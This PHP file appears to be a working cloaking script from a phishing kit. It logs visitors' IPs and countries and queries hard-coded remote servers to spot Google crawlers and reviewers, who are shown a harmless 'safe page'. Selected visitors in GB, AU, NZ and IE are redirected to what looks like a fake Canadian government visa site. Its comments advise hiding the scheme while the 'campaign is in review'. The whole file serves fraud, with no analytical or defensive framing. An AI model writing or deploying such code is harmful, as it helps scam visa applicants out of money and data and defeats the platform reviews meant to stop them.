<?php
session_start();
ob_start();


// EDIT FROM BELOW IF YOU WISH
$safe_page	= "sss.html";
$visitor	= "https://etavisa-gov.ca/";
$review		= 0; //if set to 1 , it will force ALL/ANY traffic to safe page

//PRO TIP: its nice to set $review = 1 when campagin is in review, well its optional too
//EDIT END


// WARNING
// DO NOT MODIFY BELOW CONTENT


$ip = getRealIpPlus();
$CC = getLocationInfoByIp();

if(isset($_SESSION['g']) && $_SESSION['g']=="true"){
include_once $safe_page;
exit();
}


if($review){
	file_put_contents ("b.txt", $ip."---".gethostbyaddr($ip).":::".$CC.":::CFAIL\n", FILE_APPEND);
include_once $safe_page;
exit();
}

$google = false;
if( strpos( strtolower($_SERVER['HTTP_USER_AGENT']), 'google' ) !== false ) {
$google = true;
}else if(strpos( strtolower(gethostbyaddr($ip)), 'google' ) !== false ){
$google = true;
}
else{
$is = getcurl("http://45.76.25.234/new/u2.php?ip=".$ip);
if($is != "" AND $is == 1 || $is == "1"){
$google = true;
}


if($is == "0" || $is == 0) {
$is = getcurl("http://45.76.25.234/new/u1.php?ip=".$ip);
if($is != "" AND $is == 1 || $is == "1"){
$google = true;
}


}

if($is == "") {
$is = getcurl("http://62.210.111.109/u2.php?ip=".$ip);
if($is != "" AND $is == 1 || $is == "1"){
$google = true;
}
}

if($is == "")
{
$google = false;
file_put_contents ("e.txt", $ip."---".gethostbyaddr($ip).":::".$CC.":::CFAIL\n", FILE_APPEND);
}
}


if($google == false)
{
	if($CC == "GB" || $CC == "AU" || $CC == "NZ" || $CC == "IE"){

	}else{
	$google = true;
	file_put_contents ("e.txt", $ip."---".gethostbyaddr($ip).":::".$CC.":::GEOFAIL\n", FILE_APPEND);
	}


}


if($google){
	//chdir('..');
	$_SESSION['g']="true";
	include_once $safe_page;
	file_put_contents ("p.txt", $ip."---".gethostbyaddr($ip).":::".$CC.":::GEOFAIL\n", FILE_APPEND);

	exit();
}else{

	header("Location: ".$visitor."");
	exit();
}


function getLocationInfoByIp(){

 global $ip;

 $c=getcurl("http://45.76.25.234/c.php?ip=".$ip);
 if($c != "")
	return $c;

$c=getcurl("http://62.210.111.109/c.php?ip=".$ip);
 if($c != "")
	return $c;

$geo=getcurl("http://www.geoplugin.net/json.gp?ip=".$ip);
    $ip_data = @json_decode($geo);
    if($ip_data && $ip_data->geoplugin_countryName != null){
        $result = $ip_data->geoplugin_countryCode;
    }
    return $result;
}


function getcurl($url){
 $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 3); //timeout in seconds
$is = curl_exec($ch);
return $is;
curl_close($ch);
}

function getRealIpPlus(){

$ip=""; //catch the missed 1%

if (!empty($_SERVER['HTTP_CLIENT_IP'])) { //check if IP is from shared Internet
$ip=$_SERVER['HTTP_CLIENT_IP'];
}

elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { //check if IP is passed from proxy
if( strpos( $_SERVER['HTTP_X_FORWARDED_FOR'], "," ) !== false)
{
	$ip=trim(end(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])));
}
else{
	$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
}

}

elseif (!empty($_SERVER['REMOTE_ADDR'])) { //standard IP check
$ip=$_SERVER['REMOTE_ADDR'];
}
return $ip;
}
?>
